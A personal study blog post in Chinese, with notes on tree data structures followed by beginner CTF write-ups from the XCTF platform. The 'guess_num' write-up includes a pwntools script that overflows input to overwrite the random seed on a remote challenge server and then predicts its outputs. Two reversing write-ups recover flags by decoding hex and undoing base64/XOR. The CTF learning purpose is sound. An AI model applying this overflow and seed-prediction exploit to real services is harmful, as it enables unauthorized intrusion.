---
title: 7-30
abbrlink: 2827
hidden: true
date: 2020-07-30 15:00:30
mathjax: true
---


## 树和二叉树
非线性结构：至少存在一个数据元素可以有两个或者两个以上的前驱或后继元素。    
树形结构属于非线性结构，是以分支关系定义的一种层次结构。树形结构中的一个元素为一个结点，结点之间的关系为分支，**树中一个结点包含了一个数据元素以及若干指向其子树的分支**     
### 树
当结点n=0时称为空树   

从逻辑上看：
1. 任何非空树中有且只有一个结点没有前驱结点，就是树的根结点
2. 除了根节点外，其余所有结点有且只有一个直接前驱结点
3. 包括根结点在内，每个结点可以有多个直接后继结点
4. 树形结构具有递归特征

树形结构中的数据元素之间的关系桐城市一对多或者多对一     
#### 树的逻辑表示方法
1. 树形表示
2. 文氏图表示
3. 凹入表示
4. 嵌套括号表示

#### 基本术语
1.结点的度    
结点拥有的子树数目   
2.树的度    
树种各结点度的最大值    
3.叶子结点    
度为0的结点称为叶子结点或者终端结点。叶结点没有子孙结点   
4.分支结点（非终端结点）    
度不为0的结点，除了根结点之外的分支结点称为内部结点    
5.结点的层次    
从根结点所在的层开始，根节点为第1层，根节点的孩子结点在第2层   
6.树的深度（高度）   
树中结点的最大层次数   
7.有序树   
8.森林     
m棵（m≥0）树的集合。对于树种每个分支结点来说，其子树的集合就是一个森林
#### 性质
非空树的结点总数等于树中所有结点的度之和加一   
度为k的非空树的第i层最多有\\(k^(i-1)\\)个结点    
深度为h的k叉树最多有\frac{$k^h-1$}{k-1}个结点（ $\sum_1^h k^(i-1) $ )    
具有n个结点的k叉树的最小深度为$\log_k (n(k-1)+1)$

//为啥就弄不出数学公式呢...

## guess_num
wirteup:   
```py
from pwn import *
from ctypes import *
p = remote("220.249.52.133", 45173)
p.recv()
a = "1"*0x20 + p64(1)
p.sendline(a)
p.recv()
c = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
c.srand(1)
for i in range(10):
	a = str(c.rand()%6+1)
	p.recvuntil('number:')
	print(a)
	p.sendline(a)
p.interactive()
```
这题遇到了几个之前没了解过的地方：   
1. rand、srand()、seed：https://blog.csdn.net/weixin_33962621/article/details/85825271
2. python中调用动态链接库[ctypes --- Python 的外部函数库 — Python 3.7.8 文档](https://docs.python.org/zh-cn/3.7/library/ctypes.html)    
3. sendline()只能传字符和字符串，所以循环里a赋值的时候要转换srt(),不然会报错“'int' object has no attribute 'encode'”
4. linux下运行.py的方法：   
>python 文件名.py
5. linux下编译c的方法（虽然没有用上）：https://blog.csdn.net/weixin_44895651/article/details/89309790  

参考：https://www.b1ndsec.cn/?p=319     
写完之后看了别人的题解，发现可以不用ctypes，也应证了第3条![xctf-writeup](https://adworld.xctf.org.cn/media/uploads/writeup/60f6d96a951f11ea88a9fa163e3c3fd2.png)



## [Hello，CTF](https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5075&page=1)
放到ida里看伪代码   
![aKBph6.png](https://s1.ax1x.com/2020/07/30/aKBph6.png)   
其中这处能看出是将输入的内容转换为16进制的数字   
![aKBP1O.png](https://s1.ax1x.com/2020/07/30/aKBP1O.png)   
![aKBC9K.png](https://s1.ax1x.com/2020/07/30/aKBC9K.png)   
再与“437...56e"那串数字进行对比，所以只要把“437...56e"转换回去就行了    
```py
a=bytes.fromhex("437261636b4d654a757374466f7246756e")
print(a)
#python真好用
```


## [python-trade](https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5083&page=1)
这个名字真是...   

下载了一个.pyc文件，放到在线反编译的网站上看看    

大概是把输入的内容的每一位经过一个变换，最后再转换为base64编码，跟”XlNkVmtUI1MgXWBZXCFeKY+AaXNt“进行对比    

所以就可以直接开始写了
```py
import base64
correct = 'XlNkVmtUI1MgXWBZXCFeKY+AaXNt'
s=base64.b64decode(correct)
flag=''
for i in s:
    x = i-16	#这边如果写ord(i)会报错
    x=x^32
    flag+=chr(x)
print(flag)
```
i-16那行：[python3遇到的"ord() expected string of length 1, but int found"问题](https://blog.csdn.net/thinszx/article/details/104519533)
其中异或（^）进行逆运算就只需要再异或一次   
异或的逆运算是同或   
